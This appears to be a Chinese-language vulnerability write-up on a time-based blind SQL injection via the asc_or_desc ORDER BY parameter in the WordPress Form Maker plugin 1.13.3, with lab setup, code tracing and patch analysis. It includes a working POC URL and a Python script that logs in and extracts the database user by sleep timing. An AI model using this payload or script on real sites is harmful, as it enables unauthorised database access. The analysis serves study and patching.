## 前言
最近在复习`SQL注入`的一些知识，对于`order
by`后面的注入遇到的不是很多，正好五月底`WordPress`的一个表单生成器插件出了一个`SQL注入`漏洞，恰好是`order
by`的问题，于是拿来分析一波。如有错误，还望师傅们批评指正。
## 1\. 环境搭建
运行环境很简单，只是在`vulapps`的基础环境的上加了`xdebug`调试插件，把`docker`容器作为远程服务器来进行调试。  
`Dockerfile`文件:
    FROM medicean/vulapps:base_lamp_php7
    RUN pecl install xdebug
    COPY php.ini /etc/php/7.0/apache2/
    COPY php.ini /etc/php/7.0/cli/
`docker-compose`文件:
    version: '3'
    services:
      lamp-php7:
        build: .
        ports:
          - "80:80"
        volumes:
          - "/Users/mengchen/Security/Code Audit/html:/var/www/html"
          - "/Users/mengchen/Security/Code Audit/tmp:/tmp"
`php.ini`中`xdebug`的配置
    [xdebug]
    zend_extension="/usr/lib/php/20151012/xdebug.so"
    xdebug.remote_enable=1
    xdebug.remote_host=10.254.254.254
    xdebug.remote_port=9000
    xdebug.remote_connect_back=0
    xdebug.profiler_enable=0
    xdebug.idekey=PHPSTORM
    xdebug.remote_log="/tmp/xdebug.log"
因为我是在`Mac`上，所以要给本机加一个`IP`地址，让`xdebug`能够连接。
    sudo ifconfig lo0 alias 10.254.254.254
`PHPStorm`也要配置好相对路径:
插件下载地址:
    https://downloads.wordpress.org/plugin/form-maker.1.13.3.zip
`WordPress`使用最新版就可以，在这里我使用的版本是`5.2.2`，语言选的简体中文。
PS: `WordPress`搭建完毕后，记得关闭自动更新。
## 2\. POC
    http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=,(case+when+(select+ascii(substring(user(),1,1)))%3d114+then+(select+sleep(5)+from+wp_users+limit+1)+else+2+end)+asc%3b
`Python`脚本，修改自[exploit-db](https://www.exploit-db.com/exploits/46958)
    #coding:utf-8
    import requests
    import time
    vul_url = "http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc="
    S = requests.Session()
    S.headers.update({"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3", "Referer": "http://127.0.0.1/wp-login.php?loggedout=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"})
    length = 0
    TIME = 3
    username = "admin"
    password = "admin"
    def login(username, password):
        data = {
            "log": "admin", 
            "pwd": "admin", 
            "wp-submit": "\xe7\x99\xbb\xe5\xbd\x95", 
            "redirect_to": "http://127.0.0.1/wp-admin/", 
            "testcookie": "1"
            }
        r = S.post('http://127.0.0.1/wp-login.php', data=data, cookies = {"wordpress_test_cookie": "WP+Cookie+check"})
    def attack():
        flag = True
        data = ""
        length = 1
        while flag:
            flag = False
            tmp_ascii = 0
            for ascii in range(32, 127):
                tmp_ascii = ascii
                start_time = time.time()
                payload = "{vul_url},(case+when+(select+ascii(substring(user(),{length},1)))%3d{ascii}+then+(select+sleep({TIME})+from+wp_users+limit+1)+else+2+end)+asc%3b".format(vul_url=vul_url, ascii=ascii, TIME=TIME, length=length)
                #print(payload)
                r = S.get(payload)
                tmp = time.time() - start_time
                if tmp >= TIME:
                    flag = True
                    break
            if flag:
                data += chr(tmp_ascii)
                length += 1
            print(data)
    login(username, password)
    attack()
## 3\. 漏洞分析
### 3.1 漏洞利用流程分析
根据`POC`，我们很容易知道，注入点在参数`asc_or_desc`上，根据它的命名，极有可能是`order by`之后的注入。  
首先大致浏览下插件目录下的文件结构:
很经典的`MVC`架构，但是有点无从下手，还是从`POC`出发吧，
首先全局搜索字符串`asc_or_desc`，根据传入的参数`page=submissions_fm&task=display`，以及我们搜索到的结果，可以猜测，`submissions_fm`就是指代的调用的插件文件，`display`就是要调用的方法。
在这里下一个断点验证一下。
根据函数调用栈，我们很容易就能知道，在`form-maker.php:502,
WDFM->form_maker()`处，代码将`FMControllerSubmissions_fm`进行了实例化，然后调用了它的`execute()`方法。
接下来就进入了`Submissions_fm.php:93, FMControllerSubmissions_fm->execute()`
获取传入的`task`和`current_id`，动态调用`FMControllerSubmissions_fm`类的方法`display`，并将`current_id`的值作为参数传入。
后面依次进入了`model`类`FMModelSubmissions_fm`中的`get_forms()`，`get_statistics();`和`blocked_ips()`方法，分别跟进之后并没有发现调用`asc_or_desc`参数。
继续往下，进入类`FMModelSubmissions_fm`中`get_labels_parameters`方法。  
路径:`wp-content/plugins/form-maker/admin/models/Submissions_fm.php:93`
到了第`133`行:
代码从这里获取了传入的`asc_or_desc`的值，并将其存入了`$asc_or_desc`变量中。
跟进一下，看一看代码对其进行了怎样的处理。
路径:`wp-content/plugins/form-maker/framework/WDW_FM_Library.php:367`
根据传入的键值`asc_or_desc`，动态调用`$_GET[$key]`，把值存入`$value`中，然后传入了静态私有方法`validate_data()`中
继续跟进，在第`395`行
使用`stripslashes()`函数去除了`value`中的反斜杠，又因为`$esc_html`为`true`，进入了`esc_html`
在[WordPress手册](https://developer.wordpress.org/reference/functions/esc_html/)中，可以查到它的作用是将传入的值转义为`HTML`块。
跟进一下，我们可以看到代码调用了两个`WordPress`的内置方法对传入的`value`值进行了处理  
路径`wp-includes/formatting.php:4348`
从`WordPress`手册中，能查到`_wp_specialchars`是对`&`、``、`"`和`'`进行了`HTML`实体编码。
可以知道，在获取`asc_or_desc`参数的过程中，只过滤了`\`、`&`、``、`"`和`'`。
然后回到`get_labels_parameters`接着往下看。
在第`161`行，因为传入的`$order_by == group_id`满足条件，成功将`$asc_or_desc`，拼接到了变量`$orderby`中。
后面虽然有一些查询操作，但是都没有拼接`$orderby`，也没有对其做进一步的过滤处理。  
导致在第`311`行，`Payload`拼接进入了`SQL`语句，然后在`312`行进行了数据库查询操作。
看一下数据库的日志也能看到，执行了`SQL`语句:
    SELECT distinct group_id FROM wp_formmaker_submits WHERE  form_id=2  ORDER BY group_id ,(case when (select ascii(substring(user(),1,1)))=114 then (select sleep(5) from wp_users limit 1) else 2 end) asc;
在`mysql`中执行一下，由于`when`后面的条件成立，语句中的`sleep(5)`生效了。
到这里，整个`POC`的执行流程我们就看完了。
### 3.2 漏洞原理分析
简单总结一下，我们传入参数`?page=submissions_fm&task=display`，让代码走到了存在漏洞的方法`get_labels_parameters`中。
而方法`get_labels_parameters`中，在获取参数`asc_or_desc`的值的过程中，基本没有进行过滤，就将其拼接进入了`SQL`语句中，并执行，导致了`SQL`注入。
## 4\. 补丁分析
我们将1.13.3版本的插件卸载掉，安装一下[1.13.4](https://downloads.wordpress.org/plugin/form-maker.1.13.4.zip)版本，查看一下是如何修复的。
路径:`wp-content/plugins/form-maker/admin/models/Submissions_fm.php:133`
简单粗暴，限制了`asc_or_desc`的值只能为`desc`和`asc`其中的一个。
## 5\. 参考链接
  * 
  * 